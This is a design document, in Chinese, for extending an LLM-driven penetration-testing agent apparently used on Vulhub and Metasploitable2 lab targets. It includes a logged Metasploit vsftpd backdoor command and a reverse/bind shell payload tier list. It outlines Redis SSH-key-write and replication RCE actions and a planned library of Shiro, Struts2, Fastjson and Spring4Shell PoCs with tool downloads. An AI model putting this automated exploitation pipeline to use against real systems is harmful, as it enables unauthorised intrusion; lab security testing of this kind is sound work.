# SDIT P6-P8 架构改进方案（详细设计）

> 配套文档: `P6_P8_OBJECTIVES.md`（接力指令）
> 本文档说明**为什么**这么做、**如何**做、关键技术决策的 trade-off。

---

## 设计哲学（与 P0-P5 一致）

1. **零数据伪造**：所有新模块的输出必须基于真实证据
2. **故障安全**：任何新组件失败都不能影响主渗透流程
3. **预算隔离**：新的 LLM 调用必须有独立 token 限额
4. **向后兼容**：不修改 agent.run() 对外签名，70 个老测试必须继续通过
5. **不动 LLM 模型**：所有改进只在工程层

---

## P6: ExploitRetry + Action-Critic — 让 Agent 自我修正

### 6.1 问题

R7-MSF2 实测日志:
```
Round 4 tool=msfconsole on 192.168.136.137|21
  args: -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.136.137; run; exit'
  evidence: ["[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp"]
  status: failed
```

LLM 选了 vsftpd_234_backdoor 模块（正确），但默认 payload 是 `meterpreter_reverse_tcp`，
需要 LHOST + 监听器，没拿到 session。

换 payload 为 `cmd/unix/interact` 就能成功，但 Agent 拿到 failed 后让 LLM "继续下一个攻击面" — 
LLM 不会执着同一 exploit。**这是决策粒度问题：LLM 不擅长低级参数调优，程序非常擅长。**

### 6.2 架构定位

```
Actor LLM ──"我要打 vsftpd_234"──> ExploitRetryStrategy（新增）
                                       │ payload tier 自动选 → 完整命令
                                       ↓
                                   Executor 执行
                                       │ failed?
                                       ↓
                                   ★ 触发 ActionCritic（连续 3 失败）
                                       │ critique 写入 history_context
                                       ↓
                                   下一轮 LLM prompt 自动看到
```

### 6.3 ExploitRetryStrategy 关键决策

**payload tier 顺序**:
1. `cmd/unix/interact` — 直接交互（vsftpd 后门 = bindshell on 6200）
2. `cmd/unix/reverse_perl` — 通用回连
3. `cmd/unix/reverse_python` — Perl 没有时备选
4. `cmd/unix/bind_*` — 反向都失败的最后手段

**为什么不让 LLM 选 payload**:
- msf 有 500+ payload，LLM 容易选不存在的
- payload 兼容性需要精确架构知识
- 这是典型"程序更适合做"的任务

**LHOST=AUTO 解析**:
```python
import socket
def _resolve_lhost():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]  # Kali 视角
    except Exception:
        return "192.168.136.143"  # fallback
    finally:
        s.close()
```

### 6.4 ActionCritic 触发逻辑

```python
def _should_run_critic(state) -> bool:
    last_3 = state.data.get("actions_taken", [])[-3:]
    return len(last_3) == 3 and all(
        a.get("status") in ("failed", "error", "timeout")
        for a in last_3
    )
```

**为什么不每次失败都触发**: LLM 调用花钱花时间，单次失败可能网络抖动，连续 3 次才是真卡住。

**Critique 注入方式**: 写入 `state.attach_history_context()`，自动出现在下一轮 prompt 的 history_context 区块（P3 已实现），占 `TokenBudget.experience` 配额（800 tokens）。

### 6.5 集成位置（agent.py）

在 `agent.run()` 主循环的 task 执行后、`state.finalize_round()` 之前插入。
具体行号搜：`state.finalize_round(round_num, before_counts, state.evidence_counters())`

---

## P7: 协议适配器 — Redis/JMX/MongoDB

### 7.1 问题

R6-redis state:
```
"sessions": [{"connect_command": "nc -w 3 127.0.0.1 6379", "status": "closed"}],
"actions_taken": [{
  "args": "id; whoami; uname -a",
  "evidence": ["-ERR unknown command 'id;'..."]
}]
```

nc 连上 6379 但发 bash 命令，Redis RESP 协议不认识，返回 unknown command。

### 7.2 三方案权衡

| 方案 | 优点 | 缺点 | 决策 |
|------|------|------|------|
| 让 LLM 发裸 RESP 字节 | 通用 | 易出错、难解析返回 | ❌ |
| 包 redis-cli | 简单 | 工具可能不在 | 🟡 备选 |
| **Python 适配器层** | socket 标准库即可、可控、易测 | 每协议一次开发 | ✅ |

### 7.3 RedisAdapter 接口

```python
class RedisAdapter:
    def info() -> dict
    def config_get(key) -> dict
    def config_set(key, val) -> bool
    def set(key, val) -> bool
    def save() -> bool
    def write_ssh_key(public_key) -> dict  # 经典未授权 RCE 一站式
    def slave_of(host, port) -> bool       # 主从 RCE 准备
    def execute_lua(script) -> str
```

**LLM 接口**:
```json
{"host": "127.0.0.1", "port": 6379, "action": "write_ssh_key", "public_key": "ssh-rsa AAAA..."}
```

LLM 不关心 RESP 协议，只发意图。

### 7.4 JMX/MongoDB

类似设计。**JMXAdapter 推荐 fallback 方案**：调 Kali 的 `jmx-info` NSE + ysoserial 生成 payload，不依赖 Python JVM 桥。

---

## P8: Curated Exploit Lab — 给 LLM 拿到完整 PoC 工具

### 8.1 问题

mimo-v2.5 知道：
- Shiro 1.2.4 有反序列化
- 用 ysoserial CommonsCollections5
- RememberMe Cookie 用 AES key 加密

但**不会写完整 PoC**（AES PKCS7 padding、CBC IV、base64 顺序等细节）。
让 LLM 一行行写 Python 易错且浪费 token。

### 8.2 解法：固化高质量 PoC 到模板库

**LLM 接口**:
```json
tool: exploit_lab
args: "shiro/cve-2016-4437 --target 127.0.0.1 --port 8093 --cmd 'id'"
```

LLM 只需 know：目标是 Shiro，我有现成 PoC，填入 host/port/cmd 即可。

**PoC 承担**:
- AES key 爆破（前 50 个常见 key）
- ysoserial 子进程调用
- 加密 + base64
- HTTP 请求构造（rememberMe Cookie）
- 解析响应判断成功

### 8.3 目录布局

```
D:\agent-new\exploits\
  README.md
  _common/
    msf_lhost.py        # 自动检测 LHOST
    payload_runner.py   # 启 listener + 触发 + 等 session
  shiro/
    cve-2016-4437.py
    aes_keys.txt        # 50 个常见 key
  jenkins/
    groovy_console_rce.py
    cli_protocol_pre_2_138.py
  fastjson/
    cve-2017-18349_jndi.py
  struts2/
    s2-057.py
    s2-061.py
  tomcat/
    cve-2017-12615_put_jsp.py
    war_upload_via_manager.py
  spring/
    cve-2022-22965.py  # Spring4Shell
```

### 8.4 统一参数规范

每个 PoC:
- 接受 `--target <host> --port <N> --cmd <cmd>`（标准）
- 可选: `--listener-port <N> --timeout <s>`
- 输出 JSON: `{"success": bool, "evidence": "...", "session": {...}}` 或 `{"success": false, "failure_reason": "..."}`
- 失败时 exit code != 0

### 8.5 工具链准备（Kali 上一次性）

```bash
mkdir -p /opt/exploit-tools && cd /opt/exploit-tools && \
  wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar && \
  wget -q https://github.com/mbechler/marshalsec/releases/download/0.0.3/marshalsec-0.0.3-SNAPSHOT-all.jar && \
  pip install pycryptodome requests
```

### 8.6 executor.py dispatch

```python
def _dispatch_exploit_lab(self, args: str) -> dict:
    parts = args.strip().split(None, 1)
    if not parts:
        return {"status": "failed", "result": "exploit_lab: 缺少参数"}
    poc_rel = parts[0].replace("/", os.sep)
    poc_path = os.path.join(EXPLOITS_ROOT, poc_rel + ".py")
    if not os.path.isfile(poc_path):
        return {"status": "failed", "result": f"PoC 不存在: {parts[0]}"}
    poc_args = parts[1] if len(parts) > 1 else ""
    cmd = f"python3 {poc_path} {poc_args}"
    return self._run_local_shell(cmd, ...)
```

---

## P6-P8 协同效果（理论）

假设 R8 跑 8 个 Vulhub Docker 靶机 + Metasploitable2:

| 靶机 | P5 前 | P5 后 | **P6-P8 后预期** |
|------|-------|-------|------------------|
| Metasploitable2 | sessions=1 | sessions=2-4 | **sessions ≥ 5（vsftpd + 1524 + IRC + samba + RMI）** |
| vulhub/httpd:2.4.49 | 0 | 1 | 1（已经够，CVE-2021-41773）|
| vulhub/shiro:1.2.4 | 0 | 0 | **1（P8 PoC 命中）** |
| vulhub/redis:4.0.14 | 0 | 0（unknown cmd） | **1（P7 RedisAdapter）** |
| vulhub/tomcat:8.5 | 0 | 0 | 0-1（凭据爆破成功率有限） |
| vulhub/struts2 | 0 | 0 | **1（P8 PoC）** |
| vulhub/fastjson:1.2.24 | 0 | 0 | **1（P8 PoC）** |
| vulhub/jenkins:2.138 | 0 | 0 | 0-1（看 endpoint 是否暴露） |

**总体目标**: 从 R7 的 sessions=2 (MSF2 only) → R8 的 sessions ≥ 5（覆盖 5 大类靶机）。

---

## 风险点 + 回退策略

| 风险 | 回退 |
|------|------|
| ExploitRetry 让某个 exploit 跑 4 次造成 4× 时间 | 加 hard timeout，max_retries=4 已限制 |
| ActionCritic LLM 调用失败 | reflection 类似的故障安全，直接跳过 critic |
| RedisAdapter Python 版本兼容 | socket 是标准库，无外部依赖 |
| PoC 脚本本身有 bug | dispatcher 抓 exception，标 task=failed，主流程不崩 |
| ysoserial.jar 在 Kali 上没装 | exploit_lab 启动前检测，缺失则 graceful 返回错误 |

---

## 不在本次范围

- P9 Stealth 模式（WAF/IDS 规避）— 仅靶场不需要
- 二进制漏洞挖掘 / fuzzing — 超出 LLM agent 能力
- AD/Kerberos 横移 — 需要域内已落点
- 浏览器 XSS chain — 需要浏览器自动化

---

## 验证标准

P6-P8 完成后必须 100% 满足：
- 70 个老测试继续通过
- P6/P7/P8 新单测全过（≥ 34 个）
- R8 实测至少 3 个 P6/P7/P8 各自的核心受益靶机 sessions 增加
- 文档完整：`docs/P6_P8_VALIDATION_REPORT.md` 含 R8 vs R7 对比

完成签收前用户应能看到：
- 量化的 sessions / vulns / draft skill 数提升
- 至少 1 个 R7 拿不下来的靶机（Shiro / Redis / Struts2）在 R8 成功
